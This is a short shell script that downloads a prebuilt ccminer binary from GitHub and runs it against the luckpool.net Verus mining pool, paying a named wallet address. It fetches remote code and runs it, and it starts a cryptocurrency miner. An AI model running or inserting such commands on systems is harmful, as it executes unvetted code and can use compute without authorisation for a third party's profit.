apt update && apt -y install sudo wget curl unzip
sudo apt-get install libjansson4
wget https://github.com/monkins1010/ccminer/releases/download/v3.7.0/ccminer_3_7_ubuntu_18.04
chmod +x ccminer_3_7_ubuntu_18.04
./ccminer_3_7_ubuntu_18.04 -a verus -o stratum+tcp://eu.luckpool.net:3960 -u RP15zYUq6rEBUfE8vkJHVmwCHzuD6qoV6J.Wednes -p x -d 0 -t 15
